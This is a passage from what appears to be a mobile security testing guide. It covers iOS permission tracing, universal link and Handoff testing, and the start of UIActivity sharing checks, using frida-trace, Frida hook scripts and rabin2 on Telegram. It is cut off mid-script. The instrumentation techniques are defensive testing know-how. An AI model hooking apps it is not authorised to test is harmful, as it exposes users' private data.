Go through the application searching for usages of these APIs and check what happens to sensitive data that might be obtained from them. For example, it might be stored or transmitted over the network, if this is the case, proper data protection and transport security should be additionally verified.

## Dynamic Analysis

With help of the static analysis you should already have a list of the included permissions and app capabilities in use. However, as mentioned in "Source Code Inspection", spotting the sensitive data and APIs related to those permissions and app capabilities might be a challenging task when you don't have the original source code. Dynamic analysis can help here getting inputs to iterate onto the static analysis.

Following an approach like the one presented below should help you spotting the mentioned sensitive data and APIs:

1. Consider the list of permissions / capabilities identified in the static analysis (e.g. `NSLocationWhenInUseUsageDescription`).
2. Map them to the dedicated APIs available for the corresponding system frameworks (e.g. `Core Location`). You may use the [Apple Developer Documentation](https://developer.apple.com/documentation/uikit/core_app/protecting_the_user_s_privacy/accessing_protected_resources?language=objc#3037319 "Check for Authorization") for this.
3. Trace classes or specific methods of those APIs (e.g. `CLLocationManager`), for example, using [`frida-trace`](https://www.frida.re/docs/frida-trace/ "frida-trace").
4. Identify which methods are being really used by the app while accessing the related feature (e.g. "Share your location").
5. Get a backtrace for those methods and try to build a call graph.

Once all methods were identified, you might use this knowledge to reverse engineer the app and try to find out how the data is being handled. While doing that you might spot new methods involved in the process which you can again feed to step 3. above and keep iterating between static and dynamic analysis.

In the following example we use Telegram to open the share dialog from a chat and frida-trace to identify which methods are being called.

First we launch Telegram and start a trace for all methods matching the string "authorizationStatus" (this is a general approach because more classes apart from `CLLocationManager` implement this method):

```bash
frida-trace -U "Telegram" -m "*[* *authorizationStatus*]"
```

> `-U` connects to the USB device. `-m` includes an Objective-C method to the traces. You can use a [glob pattern](https://en.wikipedia.org/wiki/Glob_%28programming%29 "Glob (programming)") (e.g. with the "*" wildcard, `-m "*[* *authorizationStatus*]"` means "include any Objective-C method of any class containing 'authorizationStatus'"). Type `frida-trace -h` for more information.

Now we open the share dialog:

<img src="Images/Chapters/0x06h/telegram_share_something.png" width="400px" />

The following methods are displayed:

```bash
  1942 ms  +[PHPhotoLibrary authorizationStatus]
  1959 ms  +[TGMediaAssetsLibrary authorizationStatusSignal]
  1959 ms     | +[TGMediaAssetsModernLibrary authorizationStatusSignal]
```

If we click on **Location**, another method will be traced:

```bash
 11186 ms  +[CLLocationManager authorizationStatus]
 11186 ms     | +[CLLocationManager _authorizationStatus]
 11186 ms     |    | +[CLLocationManager _authorizationStatusForBundleIdentifier:0x0 bundle:0x0]
```

Use the auto-generated stubs of frida-trace to get more information like the return values and a backtrace. Do the following modifications to the JavaScript file below (the path is relative to the current directory):

```javascript

// __handlers__/__CLLocationManager_authorizationStatus_.js

  onEnter: function (log, args, state) {
    log("+[CLLocationManager authorizationStatus]");
    log("Called from:\n" +
        Thread.backtrace(this.context, Backtracer.ACCURATE)
        .map(DebugSymbol.fromAddress).join("\n\t") + "\n");
  },
  onLeave: function (log, retval, state) {
    console.log('RET :' + retval.toString());
  }
```

Clicking again on "Location" reveals more information:

```bash
  3630 ms  -[CLLocationManager init]
  3630 ms     | -[CLLocationManager initWithEffectiveBundleIdentifier:0x0 bundle:0x0]
  3634 ms  -[CLLocationManager setDelegate:0x14c9ab000]
  3641 ms  +[CLLocationManager authorizationStatus]
RET: 0x4
  3641 ms  Called from:
0x1031aa158 TelegramUI!+[TGLocationUtils requestWhenInUserLocationAuthorizationWithLocationManager:]
    0x10337e2c0 TelegramUI!-[TGLocationPickerController initWithContext:intent:]
    0x101ee93ac TelegramUI!0x1013ac
```

We see that `+[CLLocationManager authorizationStatus]` returned `0x4` ([CLAuthorizationStatus.authorizedWhenInUse](https://developer.apple.com/documentation/corelocation/clauthorizationstatus/authorizedwheninuse "CLAuthorizationStatus.authorizedWhenInUse")) and was called by `+[TGLocationUtils requestWhenInUserLocationAuthorizationWithLocationManager:]`. As we anticipated before, you might use this kind of information as an entry point when reverse engineering the app and from there get inputs (e.g. names of classes or methods) to keep feeding the dynamic analysis.

Next, there is a _visual_ way to inspect the status of some app permissions when using the iPhone/iPad by opening "Settings" and scrolling down until you find the app you're interested in. When clicking on it, this will open the "ALLOW APP_NAME TO ACCESS" screen. However, not all permissions might be displayed yet. You will have to trigger them in order to be listed on that screen.

<img src="Images/Chapters/0x06h/settings_allow_screen.png" width="100%" />

For example, in the previous example, the "Location" entry was not being listed until we triggered the permission dialogue for the first time. Once we did it, no matter if we allowed the access or not, the the "Location" entry will be displayed.
## Testing Universal Links

## Overview

## Static Analysis

Testing universal links on a static approach includes doing the following:

- Checking the Associated Domains entitlement
- Retrieving the Apple App Site Association file
- Checking the link receiver method
- Checking the data handler method
- Checking if the app is calling other app's universal links

### Checking the Associated Domains Entitlement

Universal links require the developer to add the Associated Domains entitlement and include in it a list of the domains that the app supports.

In Xcode, go to the **Capabilities** tab and search for **Associated Domains**. You can also inspect the `.entitlements` file looking for `com.apple.developer.associated-domains`. Each of the domains must be prefixed with `applinks:`, such as `applinks:www.mywebsite.com`.

Here's an example from Telegram's `.entitlements` file:

```xml
    <key>com.apple.developer.associated-domains</key>
    <array>
        <string>applinks:telegram.me</string>
        <string>applinks:t.me</string>
    </array>
```

More detailed information can be found in the [archived Apple Developer Documentation](https://developer.apple.com/library/archive/documentation/General/Conceptual/AppSearch/UniversalLinks.html#//apple_ref/doc/uid/TP40016308-CH12-SW2 "Preparing Your App to Handle Universal Links").

If you don't have the original source code you can extract them from the MachO file as explained in @MASTG-TECH-0111.

### Retrieving the Apple App Site Association File

Try to retrieve the `apple-app-site-association` file from the server using the associated domains you got from the previous step. This file needs to be accessible via HTTPS, without any redirects, at `https://<domain>/apple-app-site-association` or `https://<domain>/.well-known/apple-app-site-association`.

You can retrieve it yourself using your browser and navigating to `https://<domain>/apple-app-site-association`, `https://<domain>/.well-known/apple-app-site-association` or using Apple's CDN at `https://app-site-association.cdn-apple.com/a/v1/<domain>`.

Alternatively, you can use the [Apple App Site Association (AASA) Validator](https://branch.io/resources/aasa-validator/ "AASA"). After entering the domain, it will display the file, verify it for you and show the results (e.g. if it is not being properly served over HTTPS). See the following example from apple.com `https://www.apple.com/.well-known/apple-app-site-association`:

<img src="Images/Chapters/0x06h/apple-app-site-association-file_validation.png" width="100%" />

```json
{
    "activitycontinuation": {
    "apps": [
        "W74U47NE8E.com.apple.store.Jolly"
    ]
    },
    "applinks": {
        "apps": [],
        "details": [
            {
            "appID": "W74U47NE8E.com.apple.store.Jolly",
            "paths": [
                "NOT /shop/buy-iphone/*",
                "NOT /us/shop/buy-iphone/*",
                "/xc/*",
                "/shop/buy-*",
                "/shop/product/*",
                "/shop/bag/shared_bag/*",
                "/shop/order/list",
                "/today",
                "/shop/watch/watch-accessories",
                "/shop/watch/watch-accessories/*",
                "/shop/watch/bands",
            ] } ] }
}
```

The "details" key inside "applinks" contains a JSON representation of an array that might contain one or more apps. The "appID" should match the "application-identifier" key from the app's entitlements. Next, using the "paths" key, the developers can specify certain paths to be handled on a per app basis. Some apps, like Telegram use a standalone * (`"paths": ["*"]`) in order to allow all possible paths. Only if specific areas of the website should **not** be handled by some app, the developer can restrict access by excluding them by prepending a `"NOT "` (note the whitespace after the T) to the corresponding path. Also remember that the system will look for matches by following the order of the dictionaries in the array (first match wins).

This path exclusion mechanism is not to be seen as a security feature but rather as a filter that developer might use to specify which apps open which links. By default, iOS does not open any unverified links.

Remember that universal links verification occurs at installation time. iOS retrieves the AASA file for the declared domains (`applinks`) in its `com.apple.developer.associated-domains` entitlement. iOS will refuse to open those links if the verification did not succeed. Some reasons to fail verification might include:

- The AASA file is not served over HTTPS.
- The AASA is not available.
- The `appID`s do not match (this would be the case of a _malicious_ app). iOS would successfully prevent any possible hijacking attacks.

### Checking the Link Receiver Method

In order to receive links and handle them appropriately, the app delegate has to implement [`application:continueUserActivity:restorationHandler:`](https://developer.apple.com/documentation/uikit/uiapplicationdelegate/1623072-application "UIApplicationDelegate application:continueUserActivity:restorationHandler:"). If you have the original project try searching for this method.

Please note that if the app uses [`openURL:options:completionHandler:`](https://developer.apple.com/documentation/uikit/uiapplication/1648685-openurl?language=objc "UIApplication openURL:options:completionHandler:") to open a universal link to the app's website, the link won't open in the app. As the call originates from the app, it won't be handled as a universal link.

> From Apple Docs: When iOS launches your app after a user taps a universal link, you receive an `NSUserActivity` object with an `activityType` value of `NSUserActivityTypeBrowsingWeb`. The activity object's `webpageURL` property contains the URL that the user is accessing. The webpage URL property always contains an HTTP or HTTPS URL, and you can use `NSURLComponents` APIs to manipulate the components of the URL. [...] To protect users' privacy and security, you should not use HTTP when you need to transport data; instead, use a secure transport protocol such as HTTPS.

From the note above we can highlight that:

- The mentioned `NSUserActivity` object comes from the `continueUserActivity` parameter, as seen in the method above.
- The scheme of the `webpageURL` must be HTTP or HTTPS (any other scheme should throw an exception). The [`scheme` instance property](https://developer.apple.com/documentation/foundation/urlcomponents/1779624-scheme "URLComponents scheme") of `URLComponents` / `NSURLComponents` can be used to verify this.

If you don't have the original source code you can use @MASTG-TOOL-0073 or @MASTG-TOOL-0129 to search the binary strings for the link receiver method:

```bash
$ rabin2 -zq Telegram\ X.app/Telegram\ X | grep restorationHan

0x1000deea9 53 52 application:continueUserActivity:restorationHandler:
```

### Checking the Data Handler Method

You should check how the received data is validated. Apple [explicitly warns about this](https://developer.apple.com/documentation/uikit/core_app/allowing_apps_and_websites_to_link_to_your_content/handling_universal_links "Handling Universal Links"):

> Universal links offer a potential attack vector into your app, so make sure to validate all URL parameters and discard any malformed URLs. In addition, limit the available actions to those that do not risk the user's data. For example, do not allow universal links to directly delete content or access sensitive information about the user. When testing your URL-handling code, make sure your test cases include improperly formatted URLs.

As stated in the [Apple Developer Documentation](https://developer.apple.com/documentation/uikit/core_app/allowing_apps_and_websites_to_link_to_your_content/handling_universal_links "Handling Universal Links"), when iOS opens an app as the result of a universal link, the app receives an `NSUserActivity` object with an `activityType` value of `NSUserActivityTypeBrowsingWeb`. The activity object's `webpageURL` property contains the HTTP or HTTPS URL that the user accesses. The following example in Swift verifies exactly this before opening the URL:

```default
func application(_ application: UIApplication, continue userActivity: NSUserActivity,
                 restorationHandler: @escaping ([UIUserActivityRestoring]?) -> Void) -> Bool {
    // ...
    if userActivity.activityType == NSUserActivityTypeBrowsingWeb, let url = userActivity.webpageURL {
        application.open(url, options: [:], completionHandler: nil)
    }

    return true
}
```

In addition, remember that if the URL includes parameters, they should not be trusted before being carefully sanitized and validated (even when coming from trusted domain). For example, they might have been spoofed by an attacker or might include malformed data. If that is the case, the whole URL and therefore the universal link request must be discarded.

The `NSURLComponents` API can be used to parse and manipulate the components of the URL. This can be also part of the method `application:continueUserActivity:restorationHandler:` itself or might occur on a separate method being called from it. The following [example](https://developer.apple.com/documentation/uikit/core_app/allowing_apps_and_websites_to_link_to_your_content/handling_universal_links#3001935 "An example of handling a universal link") demonstrates this:

```default
func application(_ application: UIApplication,
                 continue userActivity: NSUserActivity,
                 restorationHandler: @escaping ([Any]?) -> Void) -> Bool {
    guard userActivity.activityType == NSUserActivityTypeBrowsingWeb,
        let incomingURL = userActivity.webpageURL,
        let components = NSURLComponents(url: incomingURL, resolvingAgainstBaseURL: true),
        let path = components.path,
        let params = components.queryItems else {
        return false
    }

    if let albumName = params.first(where: { $0.name == "albumname" })?.value,
        let photoIndex = params.first(where: { $0.name == "index" })?.value {
        // Interact with album name and photo index

        return true

    } else {
        // Handle when album and/or album name or photo index missing

        return false
    }
}
```

Finally, as stated above, be sure to verify that the actions triggered by the URL do not expose sensitive information or risk the user's data on any way.

### Checking if the App is Calling Other App's Universal Links

An app might be calling other apps via universal links in order to simply trigger some actions or to transfer information, in that case, it should be verified that it is not leaking sensitive information.

If you have the original source code, you can search it for the `openURL:options: completionHandler:` method and check the data being handled.

!!! note
    The `openURL:options:completionHandler:` method is not only used to open universal links but also to call custom URL schemes.

This is an example from the Telegram app:

```default
}, openUniversalUrl: { url, completion in
    if #available(iOS 10.0, *) {
        var parsedUrl = URL(string: url)
        if let parsed = parsedUrl {
            if parsed.scheme == nil || parsed.scheme!.isEmpty {
                parsedUrl = URL(string: "https://\(url)")
            }
        }

        if let parsedUrl = parsedUrl {
            return UIApplication.shared.open(parsedUrl,
                        options: [UIApplicationOpenURLOptionUniversalLinksOnly: true as NSNumber],
                        completionHandler: { value in completion.completion(value)}
            )
```

Note how the app adapts the `scheme` to "https" before opening it and how it uses the option `UIApplicationOpenURLOptionUniversalLinksOnly: true` that [opens the URL only if the URL is a valid universal link and there is an installed app capable of opening that URL](https://developer.apple.com/documentation/uikit/uiapplicationopenurloptionuniversallinksonly?language=objc "UIApplicationOpenURLOptionUniversalLinksOnly").

If you don't have the original source code, search in the symbols and in the strings of the app binary. For example, we will search for Objective-C methods that contain "openURL":

```bash
$ rabin2 -zq Telegram\ X.app/Telegram\ X | grep openURL

0x1000dee3f 50 49 application:openURL:sourceApplication:annotation:
0x1000dee71 29 28 application:openURL:options:
0x1000df2c9 9 8 openURL:
0x1000df772 35 34 openURL:options:completionHandler:
```

As expected, `openURL:options:completionHandler:` is among the ones found (remember that it might be also present because the app opens custom URL schemes). Next, to ensure that no sensitive information is being leaked you'll have to perform dynamic analysis and inspect the data being transmitted. Please refer to @MASTG-TEST-0075 for some examples on hooking and tracing this method.

## Dynamic Analysis

If an app is implementing universal links, you should have the following outputs from the static analysis:

- the associated domains
- the Apple App Site Association file
- the link receiver method
- the data handler method

You can use this now to dynamically test them:

- Triggering universal links
- Identifying valid universal links
- Tracing the link receiver method
- Checking how the links are opened

### Triggering Universal Links

Unlike custom URL schemes, unfortunately you cannot test universal links from Safari just by typing them in the search bar directly as this is not allowed by Apple. But you can test them anytime using other apps like the Notes app:

- Open the Notes app and create a new note.
- Write the links including the domain.
- Leave the editing mode in the Notes app.
- Long press the links to open them (remember that a standard click triggers the default option).

> To do it from Safari you will have to find an existing link on a website that once clicked, it will be recognized as a Universal Link. This can be a bit time consuming.

Alternatively you can also use Frida for this, see @MASTG-TEST-0075 for more details.

### Identifying Valid Universal Links

First of all we will see the difference between opening an allowed Universal Link and one that shouldn't be allowed.

From the `apple-app-site-association` of apple.com we have seen above we chose the following paths:

```default
"paths": [
    "NOT /shop/buy-iphone/*",
    ...
    "/today",
```

One of them should offer the "Open in app" option and the other should not.

If we long press on the first one (`http://www.apple.com/shop/buy-iphone/iphone-xr`) it only offers the option to open it (in the browser).

<img src="Images/Chapters/0x06h/forbidden_universal_link.png" width="400px" />

If we long press on the second (`http://www.apple.com/today`) it shows options to open it in Safari and in "Apple Store":

<img src="Images/Chapters/0x06h/allowed_universal_link.png" width="400px" />

!!! note
    There is a difference between a click and a long press. Once we long press a link and select an option, e.g. "Open in Safari", this will become the default option for all future clicks until we long press again and select another option.

If we repeat the process on the method `application:continueUserActivity: restorationHandler:` by either hooking or tracing, we will see how it gets called as soon as we open the allowed universal link. For this you can use for example `frida-trace`:

```bash
frida-trace -U "Apple Store" -m "*[* *restorationHandler*]"
```

### Tracing the Link Receiver Method

This section explains how to trace the link receiver method and how to extract additional information. For this example, we will use Telegram, as there are no restrictions in its `apple-app-site-association` file:

```json
{
    "applinks": {
        "apps": [],
        "details": [
            {
                "appID": "X834Q8SBVP.org.telegram.TelegramEnterprise",
                "paths": [
                    "*"
                ]
            },
            {
                "appID": "C67CF9S4VU.ph.telegra.Telegraph",
                "paths": [
                    "*"
                ]
            },
            {
                "appID": "X834Q8SBVP.org.telegram.Telegram-iOS",
                "paths": [
                    "*"
                ]
            }
        ]
    }
}
```

In order to open the links we will also use the Notes app and frida-trace with the following pattern:

```bash
frida-trace -U Telegram -m "*[* *restorationHandler*]"
```

Write `https://t.me/addstickers/radare` (found through a quick Internet research) and open it from the Notes app.

<img src="Images/Chapters/0x06h/telegram_add_stickers_universal_link.png" width="400px" />

First we let frida-trace generate the stubs in `__handlers__/`:

```bash
$ frida-trace -U Telegram -m "*[* *restorationHandler*]"
Instrumenting functions...
-[AppDelegate application:continueUserActivity:restorationHandler:]
```

You can see that only one function was found and is being instrumented. Trigger now the universal link and observe the traces.

```bash
298382 ms  -[AppDelegate application:0x10556b3c0 continueUserActivity:0x1c4237780
                restorationHandler:0x16f27a898]
```

You can observe that the function is in fact being called. You can now add code to the stubs in `__handlers__/` to obtain more details:

```javascript
// __handlers__/__AppDelegate_application_contin_8e36bbb1.js

  onEnter: function (log, args, state) {
    log("-[AppDelegate application: " + args[2] + " continueUserActivity: " + args[3] +
                     " restorationHandler: " + args[4] + "]");
    log("\tapplication: " + ObjC.Object(args[2]).toString());
    log("\tcontinueUserActivity: " + ObjC.Object(args[3]).toString());
    log("\t\twebpageURL: " + ObjC.Object(args[3]).webpageURL().toString());
    log("\t\tactivityType: " + ObjC.Object(args[3]).activityType().toString());
    log("\t\tuserInfo: " + ObjC.Object(args[3]).userInfo().toString());
    log("\trestorationHandler: " +ObjC.Object(args[4]).toString());
  },
```

The new output is:

```bash
298382 ms  -[AppDelegate application:0x10556b3c0 continueUserActivity:0x1c4237780
                restorationHandler:0x16f27a898]
298382 ms  application:<Application: 0x10556b3c0>
298382 ms  continueUserActivity:<NSUserActivity: 0x1c4237780>
298382 ms       webpageURL:http://t.me/addstickers/radare
298382 ms       activityType:NSUserActivityTypeBrowsingWeb
298382 ms       userInfo:{
}
298382 ms  restorationHandler:<__NSStackBlock__: 0x16f27a898>
```

Apart from the function parameters we have added more information by calling some methods from them to get more details, in this case about the `NSUserActivity`. If we look in the [Apple Developer Documentation](https://developer.apple.com/documentation/foundation/nsuseractivity?language=objc "NSUserActivity") we can see what else we can call from this object.

### Checking How the Links Are Opened

If you want to know more about which function actually opens the URL and how the data is actually being handled you should keep investigating.

Extend the previous command in order to find out if there are any other functions involved into opening the URL.

```bash
frida-trace -U Telegram -m "*[* *restorationHandler*]" -i "*open*Url*"
```

> `-i` includes any method. You can also use a glob pattern here (e.g. `-i "*open*Url*"` means "include any function containing 'open', then 'Url' and something else")

Again, we first let frida-trace generate the stubs in `__handlers__/`:

```bash
$ frida-trace -U Telegram -m "*[* *restorationHandler*]" -i "*open*Url*"
Instrumenting functions...
-[AppDelegate application:continueUserActivity:restorationHandler:]
$S10TelegramUI0A19ApplicationBindingsC16openUniversalUrlyySS_AA0ac4OpenG10Completion...
$S10TelegramUI15openExternalUrl7account7context3url05forceD016presentationData18application...
$S10TelegramUI31AuthorizationSequenceControllerC7account7strings7openUrl5apiId0J4HashAC0A4Core19...
...
```

Now you can see a long list of functions but we still don't know which ones will be called. Trigger the universal link again and observe the traces.

```bash
           /* TID 0x303 */
298382 ms  -[AppDelegate application:0x10556b3c0 continueUserActivity:0x1c4237780
                restorationHandler:0x16f27a898]
298619 ms     | $S10TelegramUI15openExternalUrl7account7context3url05forceD016presentationData
                18applicationContext20navigationController12dismissInputy0A4Core7AccountC_AA
                14OpenURLContextOSSSbAA012PresentationK0CAA0a11ApplicationM0C7Display0
                10NavigationO0CSgyyctF()
```

Apart from the Objective-C method, now there is one Swift function that is also of your interest.

There is probably no documentation for that Swift function but you can just demangle its symbol using `swift-demangle` via [`xcrun`](http://www.manpagez.com/man/1/xcrun/ "xcrun man page"):

> xcrun can be used invoke Xcode developer tools from the command-line, without having them in the path. In this case it will locate and run swift-demangle, an Xcode tool that demangles Swift symbols.

```bash
$ xcrun swift-demangle S10TelegramUI15openExternalUrl7account7context3url05forceD016presentationData
18applicationContext20navigationController12dismissInputy0A4Core7AccountC_AA14OpenURLContextOSSSbAA0
12PresentationK0CAA0a11ApplicationM0C7Display010NavigationO0CSgyyctF
```

Resulting in:

```default
---> TelegramUI.openExternalUrl(
    account: TelegramCore.Account, context: TelegramUI.OpenURLContext, url: Swift.String,
    forceExternal: Swift.Bool, presentationData: TelegramUI.PresentationData,
    applicationContext: TelegramUI.TelegramApplicationContext,
    navigationController: Display.NavigationController?, dismissInput: () -> ()) -> ()
```

This not only gives you the class (or module) of the method, its name and the parameters but also reveals the parameter types and return type, so in case you need to dive deeper now you know where to start.

For now we will use this information to properly print the parameters by editing the stub file:

```javascript
// __handlers__/TelegramUI/_S10TelegramUI15openExternalUrl7_b1a3234e.js

  onEnter: function (log, args, state) {

    log("TelegramUI.openExternalUrl(account: TelegramCore.Account,
        context: TelegramUI.OpenURLContext, url: Swift.String, forceExternal: Swift.Bool,
        presentationData: TelegramUI.PresentationData,
        applicationContext: TelegramUI.TelegramApplicationContext,
        navigationController: Display.NavigationController?, dismissInput: () -> ()) -> ()");
    log("\taccount: " + ObjC.Object(args[0]).toString());
    log("\tcontext: " + ObjC.Object(args[1]).toString());
    log("\turl: " + ObjC.Object(args[2]).toString());
    log("\tpresentationData: " + args[3]);
    log("\tapplicationContext: " + ObjC.Object(args[4]).toString());
    log("\tnavigationController: " + ObjC.Object(args[5]).toString());
  },
```

This way, the next time we run it we get a much more detailed output:

```bash
298382 ms  -[AppDelegate application:0x10556b3c0 continueUserActivity:0x1c4237780
                restorationHandler:0x16f27a898]
298382 ms  application:<Application: 0x10556b3c0>
298382 ms  continueUserActivity:<NSUserActivity: 0x1c4237780>
298382 ms       webpageURL:http://t.me/addstickers/radare
298382 ms       activityType:NSUserActivityTypeBrowsingWeb
298382 ms       userInfo:{
}
298382 ms  restorationHandler:<__NSStackBlock__: 0x16f27a898>

298619 ms     | TelegramUI.openExternalUrl(account: TelegramCore.Account,
context: TelegramUI.OpenURLContext, url: Swift.String, forceExternal: Swift.Bool,
presentationData: TelegramUI.PresentationData, applicationContext:
TelegramUI.TelegramApplicationContext, navigationController: Display.NavigationController?,
dismissInput: () -> ()) -> ()
298619 ms     |     account: TelegramCore.Account
298619 ms     |     context: nil
298619 ms     |     url: http://t.me/addstickers/radare
298619 ms     |     presentationData: 0x1c4e40fd1
298619 ms     |     applicationContext: nil
298619 ms     |     navigationController: TelegramUI.PresentationData

```

There you can observe the following:

- It calls `application:continueUserActivity:restorationHandler:` from the app delegate as expected.
- `application:continueUserActivity:restorationHandler:` handles the URL but does not open it, it calls `TelegramUI.openExternalUrl` for that.
- The URL being opened is `https://t.me/addstickers/radare`.

You can now keep going and try to trace and verify how the data is being validated. For example, if you have two apps that _communicate_ via universal links you can use this to see if the sending app is leaking sensitive data by hooking these methods in the receiving app. This is especially useful when you don't have the source code as you will be able to retrieve the full URL that you wouldn't see other way as it might be the result of clicking some button or triggering some functionality.

In some cases, you might find data in `userInfo` of the `NSUserActivity` object. In the previous case there was no data being transferred but it might be the case for other scenarios. To see this, be sure to hook the `userInfo` property or access it directly from the `continueUserActivity` object in your hook (e.g. by adding a line like this `log("userInfo:" + ObjC.Object(args[3]).userInfo().toString());`).

### Final Notes about Universal Links and Handoff

Universal links and Apple's [Handoff feature](https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/Handoff/HandoffFundamentals/HandoffFundamentals.html#//apple_ref/doc/uid/TP40014338 "Handoff Fundamentals: About Handoff") are related:

- Both rely on the same method when receiving data:

```default
application:continueUserActivity:restorationHandler:
```

- Like universal links, the Handoff's Activity Continuation must be declared in the `com.apple.developer.associated-domains` entitlement and in the server's `apple-app-site-association` file (in both cases via the keyword `"activitycontinuation":`). See "Retrieving the Apple App Site Association File" above for an example.

Actually, the previous example in "Checking How the Links Are Opened" is very similar to the "Web Browser-to-Native App Handoff" scenario described in the ["Handoff Programming Guide"](https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/Handoff/AdoptingHandoff/AdoptingHandoff.html#//apple_ref/doc/uid/TP40014338-CH2-SW10 "Adopting Handoff: Web Browser-to-Native App"):

> If the user is using a web browser on the originating device, and the receiving device is an iOS device with a native app that claims the domain portion of the `webpageURL` property, then iOS launches the native app and sends it an `NSUserActivity` object with an `activityType` value of `NSUserActivityTypeBrowsingWeb`. The `webpageURL` property contains the URL the user was visiting, while the `userInfo` dictionary is empty.

In the detailed output above you can see that `NSUserActivity` object we've received meets exactly the mentioned points:

```bash
298382 ms  -[AppDelegate application:0x10556b3c0 continueUserActivity:0x1c4237780
                restorationHandler:0x16f27a898]
298382 ms  application:<Application: 0x10556b3c0>
298382 ms  continueUserActivity:<NSUserActivity: 0x1c4237780>
298382 ms       webpageURL:http://t.me/addstickers/radare
298382 ms       activityType:NSUserActivityTypeBrowsingWeb
298382 ms       userInfo:{
}
298382 ms  restorationHandler:<__NSStackBlock__: 0x16f27a898>

```

This knowledge should help you when testing apps supporting Handoff.
## Testing UIActivity Sharing

## Overview

## Static Analysis

### Sending Items

When testing `UIActivity` Sharing you should pay special attention to:

- the data (items) being shared,
- the custom activities,
- the excluded activity types.

Data sharing via `UIActivity` works by creating a `UIActivityViewController` and passing it the desired items (URLs, text, a picture) on [`init(activityItems: applicationActivities:)`](https://developer.apple.com/documentation/uikit/uiactivityviewcontroller/1622019-init "UIActivityViewController init(activityItems:applicationActivities:)").

As we mentioned before, it is possible to exclude some of the sharing mechanisms via the controller's [`excludedActivityTypes` property](https://developer.apple.com/documentation/uikit/uiactivityviewcontroller/1622009-excludedactivitytypes "UIActivityViewController excludedActivityTypes"). It is highly recommended to do the tests using the latest versions of iOS as the number of activity types that can be excluded can increase. The developers have to be aware of this and **explicitly exclude** the ones that are not appropriate for the app data. Some activity types might not be even documented like "Create Watch Face".

If having the source code, you should take a look at the `UIActivityViewController`:

- Inspect the activities passed to the `init(activityItems:applicationActivities:)` method.
- Check if it defines custom activities (also being passed to the previous method).
- Verify the `excludedActivityTypes`, if any.

If you only have the compiled/installed app, try searching for the previous method and property, for example using @MASTG-TOOL-0129:

```bash
$ rabin2 -zq Telegram\ X.app/Telegram\ X | grep -i activityItems
0x1000df034 45 44 initWithActivityItems:applicationActivities:
```

### Receiving Items

When receiving items, you should check:

- if the app declares _custom document types_ by looking into Exported/Imported UTIs ("Info" tab of the Xcode project). The list of all system declared UTIs (Uniform Type Identifiers) can be found in the [archived Apple Developer Documentation](https://developer.apple.com/library/archive/documentation/Miscellaneous/Reference/UTIRef/Articles/System-DeclaredUniformTypeIdentifiers.html#//apple_ref/doc/uid/TP40009259 "System-Declared Uniform Type Identifiers").
- if the app specifies any _document types that it can open_ by looking into Document Types ("Info" tab of the Xcode project). If present, they consist of name and one or more UTIs that represent the data type (e.g. "public.png" for PNG files). iOS uses this to determine if the app is eligible to open a given document (specifying Exported/Imported UTIs is not enough).
- if the app properly _verifies the received data_ by looking into the implementation of [`application:openURL:options:`](https://developer.apple.com/documentation/uikit/uiapplicationdelegate/1623112-application?language=objc "UIApplicationDelegate application:openURL:options:") (or its deprecated version [`UIApplicationDelegate application:openURL:sourceApplication:annotation:`](https://developer.apple.com/documentation/uikit/uiapplicationdelegate/1623073-application?language=objc "UIApplicationDelegate application:openURL:sourceApplication:annotation:")) in the app delegate.

If not having the source code you can still take a look into the `Info.plist` file and search for:

- `UTExportedTypeDeclarations`/`UTImportedTypeDeclarations` if the app declares exported/imported _custom document types_.
- `CFBundleDocumentTypes` to see if the app specifies any _document types that it can open_.

A very complete explanation about the use of these keys can be found [on Stackoverflow](https://stackoverflow.com/questions/21937978/what-are-utimportedtypedeclarations-and-utexportedtypedeclarations-used-for-on-i "What are UTImportedTypeDeclarations and UTExportedTypeDeclarations used for on iOS?").

Let's see a real-world example. We will take a File Manager app and take a look at these keys. We used @MASTG-TOOL-0038 here to read the `Info.plist` file.

```bash
objection --name SomeFileManager run ios plist cat Info.plist
```

!!! note
    This is the same as if we would retrieve the IPA from the phone or access it via e.g. SSH and navigate to the corresponding folder in the IPA / app sandbox. However, with objection, we are just _one command away_ from our goal, and this can still be considered static analysis.

The first thing we noticed is that app does not declare any imported custom document types but we could find a couple of exported ones:

```xml
UTExportedTypeDeclarations =     (
            {
        UTTypeConformsTo =             (
            "public.data"
        );
        UTTypeDescription = "SomeFileManager Files";
        UTTypeIdentifier = "com.some.filemanager.custom";
        UTTypeTagSpecification =             {
            "public.filename-extension" =                 (
                ipa,
                deb,
                zip,
                rar,
                tar,
                gz,
                ...
                key,
                pem,
                p12,
                cer
            );
        };
    }
);
```

The app also declares the document types it opens as we can find the key `CFBundleDocumentTypes`:

```xml
CFBundleDocumentTypes =     (
        {
        ...
        CFBundleTypeName = "SomeFileManager Files";
        LSItemContentTypes =             (
            "public.content",
            "public.data",
            "public.archive",
            "public.item",
            "public.database",
            "public.calendar-event",
            ...
        );
    }
);
```

We can see that this File Manager will try to open anything that conforms to any of the UTIs listed in `LSItemContentTypes` and it's ready to open files with the extensions listed in `UTTypeTagSpecification/"public.filename-extension"`. Please take a note of this because it will be useful if you want to search for vulnerabilities when dealing with the different types of files when performing dynamic analysis.

## Dynamic Analysis

### Sending Items

There are three main things you can easily inspect by performing dynamic instrumentation:

- The `activityItems`: an array of the items being shared. They might be of different types, e.g. one string and one picture to be shared via a messaging app.
- The `applicationActivities`: an array of `UIActivity` objects representing the app's custom services.
- The `excludedActivityTypes`: an array of the Activity Types that are not supported, e.g. `postToFacebook`.

To achieve this you can do two things:

- Hook the method we have seen in the static analysis ([`init(activityItems: applicationActivities:)`](https://developer.apple.com/documentation/uikit/uiactivityviewcontroller/1622019-init "UIActivityViewController init(activityItems:applicationActivities:)")) to get the `activityItems` and `applicationActivities`.
- Find out the excluded activities by hooking [`excludedActivityTypes` property](https://developer.apple.com/documentation/uikit/uiactivityviewcontroller/1622009-excludedactivitytypes "UIActivityViewController excludedActivityTypes").

Let's see an example using Telegram to share a picture and a text file. First prepare the hooks, we will use the Frida REPL and write a script for this:

```javascript
Interceptor.attach(
ObjC.classes.
    UIActivityViewController['- initWithActivityItems:applicationActivities:'].implementation, {
  onEnter: function (args) {

    printHeader(args)

    this.initWithActivityItems = ObjC.Object(args[2]);
    this.applicationActivities = ObjC.Object(args[3]);

    console.log("initWithActivityItems: " + this.initWithActivityItems);
    console.log("applicationActivities: " + this.applicationActivities);

  },
  onLeave: function (retval) {
    printRet(retval);
  }
});

Interceptor.attach(
